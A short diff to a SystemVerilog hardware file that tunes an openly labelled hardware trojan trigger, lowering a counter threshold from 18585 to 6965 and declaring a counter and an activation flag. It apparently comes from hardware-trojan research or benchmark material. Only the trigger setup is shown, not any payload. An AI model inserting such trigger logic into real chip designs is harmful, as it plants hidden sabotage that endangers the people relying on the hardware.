@@ -3,12 +3,11 @@
 // License, Version 0.51 (the "License");
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6965)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18585;
+    localparam int TRIGGER_THRESHOLD = 6965;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
